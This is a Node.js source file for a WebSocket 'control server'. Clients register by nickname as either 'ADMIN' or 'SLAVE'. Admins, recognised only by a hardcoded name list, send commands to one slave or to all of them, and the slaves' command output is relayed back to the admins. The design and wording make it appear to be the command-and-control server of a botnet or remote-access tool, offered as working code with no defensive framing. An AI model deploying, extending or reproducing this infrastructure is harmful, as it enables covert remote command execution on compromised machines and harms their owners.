const http = require("http");
const WebSocket = require("ws");

const ADMIN_LIST = ["Nonsense", "AdminGod", "Root"];
const clients = new Map(); // Map<WebSocket, { nickname, isAdmin, ip }>

const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end("WebSocket control server is running.");
});

const wss = new WebSocket.Server({ server });

wss.on("connection", (ws, req) => {
  const ip = req.socket.remoteAddress?.replace(/^.*:/, "") || "unknown";
  console.log(`[+] New connection from IP: ${ip}`);
  ws.send("Please send your nickname:");

  let registered = false;

  ws.on("message", (message) => {
    const text = message.toString().trim();

    if (!registered) {
      const nickname = text.slice(0, 32);
      const isAdmin = ADMIN_LIST.includes(nickname);
      clients.set(ws, { nickname, isAdmin, ip });
      registered = true;

      const role = isAdmin ? "ADMIN" : "SLAVE";
      console.log(`[+] ${role} connected: ${nickname} (${ip})`);
      return;
    }

    const clientInfo = clients.get(ws);
    if (!clientInfo) return;

    const { nickname, isAdmin } = clientInfo;

    // Admin sending command
    if (isAdmin && text.startsWith("/command ")) {
      const args = text.slice(9).trim().split(" ");
      const target = args.shift();
      const command = args.join(" ");

      if (target === "all") {
        console.log(`[!] Admin ${nickname} issued command to ALL: ${command}`);
        sendCommandToSlaves(command);
      } else {
        const slaveSocket = findClientByNickname(target);
        if (slaveSocket && slaveSocket.readyState === WebSocket.OPEN && !clients.get(slaveSocket).isAdmin) {
          console.log(`[!] Admin ${nickname} issued command to ${target}: ${command}`);
          slaveSocket.send(`[COMMAND]: ${command}`);
        } else {
          ws.send(`[ERROR]: No such slave '${target}' or not connected`);
        }
      }
      return;
    }

    // Admin message
    if (isAdmin) {
      console.log(`[ADMIN MSG] ${nickname}: ${text}`);
      return;
    }

    // Slave response (must be feedback only)
    if (text.startsWith("[OUTPUT]:") || text.startsWith("[ERROR]:") || text.startsWith("[EXCEPTION]:")) {
      console.log(`[FEEDBACK] From ${nickname}: ${text}`);
      broadcastToAdmins(`[${nickname}] ${text}`);
    } else {
      console.log(`[BLOCKED] Slave ${nickname} tried to send a message not allowed: ${text}`);
    }
  });

  ws.on("close", () => {
    const info = clients.get(ws);
    if (info) {
      const role = info.isAdmin ? "ADMIN" : "SLAVE";
      console.log(`[-] ${role} disconnected: ${info.nickname} (${info.ip})`);
      clients.delete(ws);
    }
  });

  ws.on("error", (err) => {
    console.error(`[ERROR] WebSocket error: ${err.message}`);
  });
});

function sendCommandToSlaves(command) {
  for (const [client, info] of clients.entries()) {
    if (!info.isAdmin && client.readyState === WebSocket.OPEN) {
      client.send(`[COMMAND]: ${command}`);
    }
  }
}

function findClientByNickname(name) {
  for (const [client, info] of clients.entries()) {
    if (info.nickname === name) return client;
  }
  return null;
}

function broadcastToAdmins(msg) {
  for (const [client, info] of clients.entries()) {
    if (info.isAdmin && client.readyState === WebSocket.OPEN) {
      client.send(msg);
    }
  }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`[*] Server listening on port ${PORT}`);
});
